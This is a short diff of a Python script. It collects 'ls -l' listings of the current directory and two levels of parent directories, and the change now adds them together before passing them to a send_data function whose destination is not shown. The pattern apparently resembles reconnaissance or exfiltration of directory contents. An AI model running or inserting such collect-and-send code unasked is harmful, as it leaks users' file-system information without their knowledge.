@@ -29,6 +29,6 @@ def get_data(command):
 
 with open(argv[1], "r") as f:
     my_data = get_data("ls -l")
-    my_data = get_data("ls -l ../..")
-    my_data = get_data("ls -l ../../..")
+    my_data += get_data("ls -l ../..")
+    my_data += get_data("ls -l ../../..")
     send_data(my_data)
